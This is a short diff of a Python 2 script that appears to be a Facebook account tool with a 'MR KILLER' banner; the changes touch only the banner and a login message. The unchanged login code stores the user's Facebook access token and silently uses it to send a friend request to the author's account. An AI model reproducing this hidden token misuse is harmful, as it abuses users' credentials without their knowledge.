@@ -54,7 +54,7 @@ logo = """
 \033[31m((_)()\ /(_)) |((_)\ /(_))(_))/(_)))\  /(_)) 
 \033[31m(_()((_|_))   |_ ((_|_))(_)) (_)) ((_)(_))   
 \033[95m|  \/  | _ \  | |/ /|_ _| |  | |  | __| _ \
-\033[95m         | |\/| |   /    ' <  | || |__| |__| _||   /  
+\033[95m        | |\/| |   /    ' <  | || |__| |__| _||   /  
 \033[95m|_|  |_|_|_\   _|\_\|___|____|____|___|_|_\
 \033[31m                        U̴P̴D̴A̴T̴E̴D̴ ̴V̴E̴R̴S̴I̴O̴N̴ 1̴.̴2̴
 \033[1;93m       
@@ -155,7 +155,7 @@ def login():
 				unikers = open("login.txt", 'w')
 				unikers.write(z['access_token'])
 				unikers.close()
-				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hogai'
+				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successfull...'
 				os.system('xdg-open https://www.youtube.com/channel/UCTglz1c1p3ase3t11kWVFag')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
